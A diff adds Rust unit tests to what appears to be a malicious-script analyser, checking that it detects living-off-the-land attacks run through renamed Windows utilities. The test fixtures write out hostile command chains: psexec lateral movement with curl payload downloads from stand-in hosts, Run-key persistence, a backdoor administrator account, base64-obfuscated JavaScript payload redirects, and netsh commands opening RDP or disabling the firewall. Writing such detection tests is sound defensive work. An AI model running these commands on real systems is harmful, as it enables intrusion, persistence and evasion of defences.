@@ -22821,6 +22821,255 @@ C:\Users\Public\wm.tmp invoke Create wmicimv2/Win32_Process -r:target.example @{
     }
 
     #[test]
+    fn copied_psexec_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\psexec.exe C:\Users\Public\ps.tmp
+C:\Users\Public\ps.tmp \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://copied-psexec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ps.tmp"#)
+            )),
+            "copied psexec alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-psexec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied psexec remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "psexec" && target_host == "target.example"
+            )),
+            "copied psexec lateral movement trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_reg_alias_replays_run_key_persisted_command() {
+        let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
+C:\Users\Public\rg.tmp add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /V:ON /c curl -o payload.exe https://copied-reg.example/payload.exe /f
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rg.tmp"#)
+            )),
+            "copied reg alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, value_name, command, .. }
+                    if hive == "HKCU"
+                        && value_name == "Updater"
+                        && command.contains("copied-reg.example/payload.exe")
+            )),
+            "copied reg Run-key persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-reg.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied reg persisted child download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_net_alias_emits_account_modification_traits() {
+        let script = br#"copy C:\Windows\System32\net.exe C:\Users\Public\nt.tmp
+C:\Users\Public\nt.tmp user backdoor P@ssw0rd /add
+C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nt.tmp"#)
+            )),
+            "copied net alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, .. }
+                    if action == "local-user-add" && account == "backdoor"
+            )),
+            "missing copied-net local-user-add: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, group, .. }
+                    if action == "localgroup-add"
+                        && account == "backdoor"
+                        && group.as_deref() == Some("Administrators")
+            )),
+            "missing copied-net localgroup-add: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_robocopy_alias_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXJvYm9jb3B5LmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
+copy C:\Windows\System32\robocopy.exe C:\Users\Public\rc.tmp
+C:\Users\Public\rc.tmp C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rc.tmp"#)
+            )),
+            "copied robocopy alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-robocopy.example/payload")
+            }),
+            "copied robocopy generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_replace_alias_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXJlcGxhY2UuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+copy C:\Windows\System32\replace.exe C:\Users\Public\rp.tmp
+C:\Users\Public\rp.tmp original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rp.tmp"#)
+            )),
+            "copied replace alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-replace.example/payload")
+            }),
+            "copied replace generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_xcopy_alias_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXhjb3B5LmV4YW1wbGUvcGF5bG9hZCc=")) > original.js
+copy C:\Windows\System32\xcopy.exe C:\Users\Public\xc.tmp
+C:\Users\Public\xc.tmp /y /i original.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\xc.tmp"#)
+            )),
+            "copied xcopy alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-xcopy.example/payload")
+            }),
+            "copied xcopy generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_netsh_alias_emits_remote_access_trait() {
+        let script = br#"copy C:\Windows\System32\netsh.exe C:\Users\Public\ns.tmp
+C:\Users\Public\ns.tmp advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 action=allow
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ns.tmp"#)
+            )),
+            "copied netsh alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "3389"
+            )),
+            "copied netsh RDP firewall opening was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_netsh_alias_emits_firewall_defender_evasion_trait() {
+        let script = br#"copy C:\Windows\System32\netsh.exe C:\Users\Public\ns.tmp
+C:\Users\Public\ns.tmp advfirewall set allprofiles state off
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ns.tmp"#)
+            )),
+            "copied netsh alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "netsh-fw-off" && target == "allprofiles"
+            )),
+            "copied netsh firewall disable was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_mshta_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
